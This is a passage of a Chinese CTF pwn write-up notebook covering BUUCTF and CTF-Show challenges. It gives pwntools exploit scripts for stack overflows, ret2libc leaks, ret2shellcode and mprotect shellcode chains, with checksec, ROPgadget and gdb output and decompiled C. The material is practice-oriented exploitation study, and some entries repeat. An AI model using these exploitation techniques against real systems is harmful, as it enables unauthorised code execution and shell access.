            l[i] = chr(ord(l[i])^0xD)
    return ''.join(l)

p.recv()
p.sendline('1')
p.recvuntil('encrypted\n')
payload = 'a'*88 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
payload = encrypt(payload)
p.sendline(payload)

p.recvuntil('Ciphertext\n')
p.recvuntil('\n')
puts_addr = u64(p.recvuntil('\n', drop=True).ljust(8,'\x00'))
log.success('puts_addr = ' + hex(puts_addr))
libc = LibcSearcher('puts',puts_addr)
libcbase = puts_addr - libc.dump('puts')
log.success('libcbase = ' + hex(libcbase))
p.recv()
p.sendline('1')
p.recvuntil('encrypted\n')
sys_addr = libcbase + libc.dump('system')
bin_sh = libcbase + libc.dump('str_bin_sh')
ret = 0x4006b9
payload2 = 'a'*88+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)
p.sendline(payload2)
p.interactive()
```

### ciscn_2019_n_8

```python
root@ubuntu:/home/sxylao1/pwn/questions/ciscn_2019_n_8# checksec ciscn_2019_n_8 
[*] '/home/sxylao1/pwn/questions/ciscn_2019_n_8/ciscn_2019_n_8'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

IDA静态编译，var[13]的值为17时即可进入后门拿下shell

```python
from pwn import*
#p = process("./1")
p = remote("node4.buuoj.cn", 29946)
payload = b'a'*13*4 + p32(0x11) #覆盖var[13]之前的 填充到var[13]时值为Dec_17(Hex_0x11)
#payload = p32(17)*14 #直接把var[0]~var[13]全部写为17
p.sendline(payload)
p.interactive()
```

### jarvisoj_level2

checksec后丢进IDA32，查看字符串发现有`system`和`/bin/sh`，分别是`0x08048320(.plt)`和`0x0804A024`，查看缓冲区为140Byte

```python
from pwn import *
proc = process('./level2')
#proc = remote("node4.buuoj.cn", 29946)
junk = b'a'*140
system = p32(0x08048320)
binsh = p32(0x0804A024)
payload = junk + system + b'a'*4 + binsh
proc.sendline(payload)
proc.interactive()
```

### bjdctf_2020_babystack

checksec后丢进IDA64，查看字符串找到`/bin/sh`所在的后门函数，地址为：`0x4006E6`，缓冲区填充范围为`0x18`

```python
from pwn import *
#proc = remote("node4.buuoj.cn", 29966)
proc = process('./bjdctf_2020_babystack')
junk = b'a'*0x18
backdoor = p64(0x4006E6)
payload = junk + backdoor
proc.recv() #接收了输出内容后
proc.sendline(b'64') #发送数字
proc.recv() #接收输出后
proc.sendline(payload) #发送攻击脚本
proc.interactive()
```

### get_started_3dsctf_2016

checksec后丢进IDA32，查看伪代码得到缓冲区覆盖大小为`0x38`，查看字符串发现有一个`flag.txt`，得到地址：`0x080489A0`
踩坑记录：如果没有跳转到exit函数结束的话，程序不能够回显，即flag不会被输出到屏幕上

![image-20230329204155322](./Pwn/get_started_3dsctf_2016.png)

```python
from pwn import *
from LibcSearcher import *
elf = ELF('./get_started_3dsctf_2016')
#proc = remote("node4.buuoj.cn", 29966)
proc = process('./get_started_3dsctf_2016')
junk = b'a'*0x38
flag = p32(0x080489A0)
exit_addr = elf.symbols['exit']
payload = junk + flag + p32(exit_addr) + p32(0x308CD64F) + p32(0x195719D1)
proc.sendline(payload)
print(proc.recv())
```

方法二：利用 mprotect 函数写入 shellcode 执行，可以通过 mprotect 函数将一段内存设置成可执行内存，来执行shellcode
需要指出的是，指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。

mprotect 的原型：

```c
int mprotect(void *addr, size_t len, int prot); //三个参数分别为起始地址、大小、权限
```

然后因为这个会在栈上面留下三个参数碍事，所以还有找个 pop 三个的来把他的参数从栈上弄走

```bash
root@ubuntu:/home/sxylao1/pwn/questions/get_started_3dsctf_2016# ROPgadget --binary pwn --only 'pop|ret'
Gadgets information
============================================================
0x0809e102 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
0x0809e0fa : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080b91e6 : pop eax ; ret
0x0804c56d : pop eax ; ret 0x80e
0x080d9ff8 : pop eax ; ret 0xfff7
0x080dfcd8 : pop eax ; ret 0xfff9
0x0805bf3d : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
0x0809e4c5 : pop ebp ; pop esi ; pop edi ; ret #<===弄走mproject栈上的三个参数
0x080483ba : pop ebp ; ret
0x080a25b9 : pop ebp ; ret 0x10
0x08096b21 : pop ebp ; ret 0x14
0x080718b4 : pop ebp ; ret 0xc
0x0804ab69 : pop ebp ; ret 4
0x08049a98 : pop ebp ; ret 8
0x0809e4c4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
0x0809a7dc : pop ebx ; pop edi ; ret
0x0806fc09 : pop ebx ; pop edx ; ret
0x0804f460 : pop ebx ; pop esi ; pop ebp ; ret
0x080483b7 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080a25b6 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
0x08096b1e : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14

root@ubuntu:/home/sxylao1/pwn/questions/get_started_3dsctf_2016# gdb -q pwn
Breakpoint main
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x8048000  0x80ea000 r-xp    a2000 0      /home/sxylao1/pwn/questions/get_started_3dsctf_2016/pwn
 0x80ea000  0x80ec000 rw-p     2000 a1000  /home/sxylao1/pwn/questions/get_started_3dsctf_2016/pwn
 0x80ec000  0x810f000 rw-p    23000 0      [heap]
0xf7ff9000 0xf7ffc000 r--p     3000 0      [vvar]
0xf7ffc000 0xf7ffe000 r-xp     2000 0      [vdso]
0xfffdd000 0xffffe000 rw-p    21000 0      [stack]
#先看一下修改哪一个段，可以把 0x080ea000 到 0x080ec000 都修改成可以执行的
```

```stack
esp->mprotect_addr
	 return1_addr
	 arg_1
	 arg_2
	 arg_3
	 read_addr
	 return2_addr
	 arg_1
	 arg_2
	 arg_3
	 shellcode_addr
	 
mprotect在IDA中的栈分析：
-00000001                 db ? ; undefined
+00000000  r              db 4 dup(?)
+00000004 arg_0           dd ?
+00000008 arg_4           dd ?
+0000000C arg_8           dd ?
+00000010
+00000010 ; end of stack variables
```

```python
# _*_ coding:utf-8 _*_
from pwn import *
elf = ELF('./pwn')
sh = process('./pwn')
#sh = remote('node3.buuoj.cn',27234)
pop3_ret = 0x0809e4c5
mem_addr = 0x080ea000 #可读可写的内存,但不可执行
mem_size = 0x3000    #通过调试出来的值
mem_proc = 0x7       #可代表可读可写可执行
mprotect_addr = elf.symbols['mprotect']
read_addr = elf.symbols['read']
payload_01 = 'A' * 0x38
payload_01 += p32(mprotect_addr)
payload_01 += p32(pop3_ret)   #执行完mprotect的返回地址,使esp往下+12
payload_01 += p32(mem_addr)   #mprotect函数参数1 修改的内存地址
payload_01 += p32(mem_size)   #mprotect函数参数2 修改的内存大小
payload_01 += p32(mem_proc)   #mprotect函数参数3 修改的权限
payload_01 += p32(read_addr)  #执行完上面pop3_ret后到read函数
payload_01 += p32(pop3_ret)   #执行完read后将返回到pop3_ret指令,又继续使esp+12到mem_addr
payload_01 += p32(0)          #read函数参数1 ,从输入端读取
payload_01 += p32(mem_addr)   #读取到的内容复制到指向的内存里
payload_01 += p32(0x100)      #读取大小
payload_01 += p32(mem_addr)   #这里就是shellcode了
sh.sendline(payload_01)
payload_sh = asm(shellcraft.sh(),arch = 'i386', os = 'linux') 
sh.sendline(payload_sh)#这就是read读入的内容
sh.interactive()
```

### [OGeek2019]babyrop

checksec后丢给IDA32，看见有一个比较的过程

```c
int __cdecl main()
{
  int buf; // [esp+4h] [ebp-14h] BYREF
  char v2; // [esp+Bh] [ebp-Dh]
  int fd; // [esp+Ch] [ebp-Ch]

  sub_80486BB();
  fd = open("/dev/urandom", 0); //随机数
  if ( fd > 0 )
    read(fd, &buf, 4u);
  v2 = sub_804871F(buf);
  sub_80487D0(v2);
  return 0;
}
```

![image-20230330153359153](./Pwn/[OGeek2019]babyrop01.png)

```c
int strncmp(const char *str1, const char *str2, size_t n) //把 str1 和 str2 进行比较，最多比较前 n 个字节。
//如果返回值 < 0，则表示 str1 小于 str2。
//如果返回值 > 0，则表示 str2 小于 str1。
//如果返回值 = 0，则表示 str1 等于 str2。
```

此处看到`buf`输入后作为`a1`在函数间传递，输入的长度跟 s 进行比较，
同时 main 函数中看到buf是/dev/urandom的第四位，read(fd, &buf, 4u);

```c
//sub_804871F(buf); 
int __cdecl sub_804871F(int a1) //buf就是a1
{
  size_t v1; // eax
  char s[32]; // [esp+Ch] [ebp-4Ch]
  char buf[32]; // [esp+2Ch] [ebp-2Ch]
  ssize_t v5; // [esp+4Ch] [ebp-Ch]

  memset(s, 0, sizeof(s));
  memset(buf, 0, sizeof(buf));
  sprintf(s, "%ld", a1);
  v5 = read(0, buf, 0x20u);
  buf[v5 - 1] = 0;
  v1 = strlen(buf);
  if ( strncmp(buf, s, v1) )
    exit(0);
  write(1, "Correct\n", 8u);
  return (unsigned __int8)buf[7];
}
```

参考如下函数块，开头输入/x00截断绕过strncmp检测，该函数中 a1 的值就是上个函数的返回值`buf[7]`

![](./Pwn/[OGeek2019]babyrop02.png)

buf的覆盖大小为 0x2C - 0x25 = 0x7，`payload = '/x00'+'a'*6+'/xff'` 这样就把 v5 覆盖为 /xff 了

```c
//sub_80487D0(v2);
ssize_t __cdecl sub_80487D0(char a1) //v2就是a1
{
  char buf[231]; // [esp+11h] [ebp-E7h] BYREF

  if ( a1 == 127 )
    return read(0, buf, 0xC8u);
  else
    return read(0, buf, a1); //然后在此处buf的大小跟输入的\xff字节 导致溢出
}
```

```python
from pwn import *
from LibcSearcher import *
p=process('./pwn')
elf=ELF('./pwn')
put_plt=elf.plt['puts']
put_got=elf.got['puts']
main_addr=0x8048825
payload='\x00'+'a'*6+'\xff'
p.sendline(payload)
p.recvuntil('Correct\n')
payload1 = 'a'*0xe7+'a'*4+p32(put_plt)+p32(main_addr)+p32(put_got)
p.sendline(payload1)
put_addr = u32(p.recv(4))
libc=LibcSearcher('puts',put_addr)
libc_base=put_addr-libc.dump('puts')
system_addr=libc_base+libc.dump('system')
bin_sh_addr=libc_base+libc.dump('str_bin_sh')
p.sendline(payload)
p.recvuntil('Correct\n')
payload2='a'*0xe7+'b'*0x4
payload2 += p32(system_addr)*2+p32(bin_sh_addr)
p.sendline(payload2)
p.interactive()
```

### jarvisoj_level2_x64

checksec ==> IDA64，查看字符串看见`hint`提示`/bin/sh`，地址为`0x00600A90`，`system`地址为`0x004004C0`，ret2syscall。

```bash
root@ubuntu:/home/sxylao1/pwn/questions/jarvisoj_level2_x64# ROPgadget --binary level2_x64 --only 'pop|ret' | grep 'di'
0x00000000004006b3 : pop rdi ; ret
```

```python
from pwn import *
#proc = remote('node4.buuoj.cn', 26205)
proc = process('./level2_x64')
junk = b'a'*0x88
system = 0x004004C0
binsh = 0x00600A90
poprdi = 0x004006b3
payload = junk + p64(poprdi) + p64(binsh) + p64(system)
proc.sendline(payload)
proc.interactive()
```

### [HarekazeCTF2019]baby_rop

checksec ==> IDA64，查看字符串，`/bin/sh:0x00601048`，`system:0x00400490`，ret2syscall

```bash
root@ubuntu:/home/sxylao1/pwn/questions/[HarekazeCTF2019]baby_rop# ROPgadget --binary babyrop --only 'pop|ret' | grep 'rdi'
0x0000000000400683 : pop rdi ; ret
```

```python
from pwn import *
#proc = remote('node4.buuoj.cn', 26205)
proc = process('./babyrop')
junk = b'a'*0x18
system = 0x00400490
binsh = 0x00601048
poprdi = 0x00400683
payload = junk + p64(poprdi) + p64(binsh) + p64(system)
proc.sendline(payload)
proc.interactive()
```

### ciscn_2019_en_2

checksec ==> IDA64，与一代的题一模一样，加密方式换了一下而已，做好预先的异或处理即可。
![image-20230331135407688](./Pwn/ciscn_2019_en_2.png)

```bash
root@ubuntu:/home/sxylao1/pwn/questions/ciscn_2019_en_2# gdb -q ciscn_2019_en_2
pwndbg> p main
$1 = {<text variable, no debug info>} 0x400b28 <main>
root@ubuntu:/home/sxylao1/pwn/questions/ciscn_2019_en_2# ROPgadget --binary ciscn_2019_en_2 --only 'pop|ret' | grep 'rdi'
0x0000000000400c83 : pop rdi ; ret
```

```python
from pwn import *
from LibcSearcher import *
p = remote('node4.buuoj.cn', 25642)
#p = process('./ciscn_2019_en_2')
elf = ELF('./ciscn_2019_en_2')

main_addr = 0x400B28
pop_rdi = 0x400C83

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

def encrypt(payload):
    l = list(payload)
    for i in range(len(l)):
        if l[i].isdigit():
            l[i] = chr(ord(l[i])^0xC)
        elif l[i].isupper():
            l[i] = chr(ord(l[i])^0xD)
        elif l[i].islower():
            l[i] = chr(ord(l[i])^0xE)
    return ''.join(l)

p.recv()
p.sendline('1')
p.recvuntil('encrypted\n')
payload = 'a'*88 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
payload = encrypt(payload)
p.sendline(payload)

p.recvuntil('Ciphertext\n')
p.recvuntil('\n')
puts_addr = u64(p.recvuntil('\n', drop=True).ljust(8,'\x00'))
log.success('puts_addr = ' + hex(puts_addr))
libc = LibcSearcher('puts',puts_addr)
libcbase = puts_addr - libc.dump('puts')
log.success('libcbase = ' + hex(libcbase))
p.recv()
p.sendline('1')
p.recvuntil('encrypted\n')
sys_addr = libcbase + libc.dump('system')
bin_sh = libcbase + libc.dump('str_bin_sh')
ret = 0x4006b9
payload2 = 'a'*88+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)
p.sendline(payload2)
p.interactive()
```

### not_the_same_3dsctf_2016

checksec ==> ida32，查看字符串找到`flag.txt`所在的地址为`0x080ECA2D`，通过wite把flag读出来

![image.png](F:\Info\Information\Typora\Pwn\not_the_same_3dsctf_2016_03.png)

`get_secret`读取`flag`后将`flag`放在了`bss`段

![image-20230331142619205](./Pwn/not_the_same_3dsctf_2016_01.png)

![image-20230331170440414](./Pwn/not_the_same_3dsctf_2016_02.png)

```python
from pwn import *
p=process('./not_the_same_3dsctf_2016')
elf=ELF('./not_the_same_3dsctf_2016')
#p=remote('node4.buuoj.cn',29301)
flag_addr=0x80ECA2D
payload='a'*45+p32(0x80489A0)+p32(elf.sym['write'])+p32(flag_addr)+p32(1)+p32(flag_addr)+p32(42)
#溢出返回到get_secret函数把flag存到bss段，调用write函数后返回flag地址，剩下的都是参数，1表示输出flag地址信息，长度42
p.sendline(payload)
p.interactive()
```

方法二：先找一个 pop 三个的来平衡 mprotect 的栈，通过这个函数来改掉 bss 所在的那一块的权限为可读写执行

```python
from pwn import *
#p=process('./pwn')
elf=ELF('./pwn')
p=remote('node3.buuoj.cn',28930)
mprotect_addr=elf.sym["mprotect"]
read_plt=elf.sym["read"]
pop_3_ret=0x0809e3e5
pop_ret=0x08048b0b
m_start=0x080ec000
bss= 0x80ECA2D
len=0x2000
prot=7
payload_1="a"*45+p32(mprotect_addr)+p32(pop_3_ret)+p32(m_start)+p32(len)+p32(prot)
payload_1+=p32(read_plt)+p32(bss+0x400)+p32(0)+p32(bss+0x400)+p32(0x100)
p.sendline(payload_1)
payload_2=asm(shellcraft.sh(),arch = 'i386', os = 'linux')
p.sendline(payload_2)
p.interactive()
```

### ciscn_2019_n_5

checksec ==> ida64，字符串中没有有用信息，发现gets()函数，ret2shellcode，&name = 0x601080
程序会先要求输入 0x64 的 name，会放在 bss 段(0x601080)，然后再读取输入内容到 v4 中，这个 v4 只有 0x20，存在栈溢出

![image-20230331195254022](./Pwn/ciscn_2019_n_5.png)

```python
from pwn import *
context(arch='amd64',os='linux')
p=process('./ciscn_2019_n_5')
payload1=asm(shellcraft.sh())
payload2='a'*40+p64(0x601080)
p.sendlineafter('name',payload1)
p.sendlineafter('me?',payload2)
p.interactive()
```

### others_shellcode

```bash
nc node4.buuoj.cn [port] #= =?what`s fucking this
```

### ciscn_2019_ne_5

checksec ==> IDA32，查看源码发现输入`administrator`进入程序，查询字符串得到`system.plt`地址为`0x080484D0`

```c
int __cdecl GetFlag(char *src) //藏了一个case4 里面的GetFlag中有个strcpy
{
  char dest[4]; // [esp+0h] [ebp-48h] BYREF
  char v3[60]; // [esp+4h] [ebp-44h] BYREF

  *(_DWORD *)dest = 48; //48junk
  memset(v3, 0, sizeof(v3));
  strcpy(dest, src); //拷贝src到dest中 存在栈溢出 而src输入的地方参考下个代码块
  return printf("The flag is your log:%s\n", dest);
}
```

```c
int __cdecl AddLog(int a1)
{
  printf("Please input new log info:");
  return __isoc99_scanf("%128s", a1); //此处读取输入
}
```

```bash
root@ubuntu:/home/sxylao1/pwn/questions/ciscn_2019_ne_5# ROPgadget --binary ciscn_2019_ne_5 --string 'sh'
Strings information
============================================================
0x080482ea : sh
```

```python
from pwn import *
p = process("./ciscn_2019_ne_5")
sh = 0x080482ea
system = 0x080484D0
junk = b'a'*0x48
passwd = "administrator"
p.sendlineafter("password:", passwd)
p.sendlineafter(":", '1')
payload = junk +b'a'*4 + p32(system) + b'a'*4 + p32(sh)
p.sendlineafter("info:",payload)
p.sendlineafter(":", '4')
p.interactive()
```

## CTF-Show

### Challenges

#### pwn03

```python
from pwn import *

sh = process('./stack')
#sh = remote('111.231.70.44',28007)
context.log_level = 'debug'
elf = ELF('./stack')

#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = elf.libc



puts_plt_addr =elf.plt['puts']
puts_got_addr  =elf.got['puts']
main_addr =elf.sym['_start']
payload = "a"*13
payload += p32(puts_plt_addr)
payload += p32(main_addr)
payload += p32(puts_got_addr)
sh.recvuntil('!\n')
sh.sendline(payload)
sh.recvuntil("\n\n")
puts_addr = u32(sh.recv(4))
print "puts:"
print hex(puts_addr)

libc_puts_addr = int(libc.sym['puts'])
base_addr = puts_addr-libc_puts_addr

system_addr = base_addr+int(libc.sym['system'])
binsh_addr = base_addr+int(libc.search('/bin/sh').next())

max_payload  = 'a' * 13
print "base:"
print hex(base_addr)
print "system:"
print hex(system_addr)
print "binsh:"
print hex(binsh_addr) 

max_payload += p32(system_addr)
max_payload += p32(main_addr)
max_payload += p32(binsh_addr)
sleep(1)
sh.recvuntil("\n")
sleep(1)
sh.sendline(max_payload)
sh.interactive()
```

### 愚人杯

```python
from pwn import *
context(arch = 'i386',os = 'linux',log_level = 'debug')
io = process('./pwn')
elf = ELF('./pwn')
__libc_start__main = elf.sym['__libc_start__main']

def add(size, content):
    io.recvuntil(":")
    io.sendline("1")
    io.recvuntil(":")
    io.sendline(str(size))
    io.recvuntil(":")
    io.sendline(content)


def free(idx):
    io.recvuntil(":")
    io.sendline("2")
    io.recvuntil(":")
    io.sendline(str(idx))


def show(idx):
    io.recvuntil(":")
    io.sendline("3")
    io.recvuntil(":")
    io.sendline(str(idx))


add(32, "aaaa")
add(32, "ddaa")

free(0)
free(1)

add(8, p32(__libc_start__main))

show(0)

io.interactive()
```

